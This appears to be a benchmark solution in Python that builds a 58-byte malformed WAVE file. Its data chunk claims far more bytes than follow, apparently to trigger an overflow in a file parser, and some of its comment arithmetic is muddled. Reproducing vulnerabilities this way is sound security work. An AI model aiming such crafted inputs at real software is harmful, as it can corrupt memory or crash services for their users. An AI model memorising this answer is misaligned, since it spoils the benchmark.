import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF file structure with malformed chunk size
        # RIFF header: 4 bytes 'RIFF', 4 bytes total size, 4 bytes 'WAVE'
        # Then chunks with 4-byte ID and 4-byte size
        
        # Create a RIFF/WAVE file with problematic chunk size
        # The vulnerability: chunk size larger than remaining data causes overflow
        
        # Build a minimal valid WAVE file structure first
        riff_size = 36  # Will be adjusted
        fmt_chunk_size = 16
        data_chunk_size = 4
        
        # Create bytes buffer
        data = bytearray()
        
        # RIFF header
        data.extend(b'RIFF')
        data.extend(struct.pack('<I', riff_size))
        data.extend(b'WAVE')
        
        # fmt chunk
        data.extend(b'fmt ')
        data.extend(struct.pack('<I', fmt_chunk_size))
        data.extend(struct.pack('<H', 1))  # Audio format: PCM
        data.extend(struct.pack('<H', 1))  # Num channels
        data.extend(struct.pack('<I', 22050))  # Sample rate
        data.extend(struct.pack('<I', 44100))  # Byte rate
        data.extend(struct.pack('<H', 2))  # Block align
        data.extend(struct.pack('<H', 16))  # Bits per sample
        
        # data chunk with problematic size
        data.extend(b'data')
        # Set chunk size larger than remaining file (causing overflow)
        # The ground truth size is 58 bytes, so we make total file 58 bytes
        # Current size: 4(RIFF) + 4(size) + 4(WAVE) + 4(fmt) + 4(fmt_size) + 16(fmt_data) + 4(data) + 4(data_size) = 44 bytes
        # Need 14 more bytes to reach 58, but data chunk size is 4, so we have 4 data bytes
        # Actually data bytes: 58 - 44 = 14 bytes, but we need chunk size to be > remaining
        
        remaining_bytes = 58 - len(data) - 4  # Minus 4 for the size field we're about to write
        # Set chunk size to be larger than remaining bytes to cause overflow
        data.extend(struct.pack('<I', remaining_bytes + 100))  # Much larger than available
        
        # Add some sample data (less than chunk size)
        sample_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        data.extend(sample_data)
        
        # Truncate to exact length 58
        data = data[:58]
        
        # Update RIFF size in header
        riff_size = len(data) - 8
        data[4:8] = struct.pack('<I', riff_size)
        
        return bytes(data)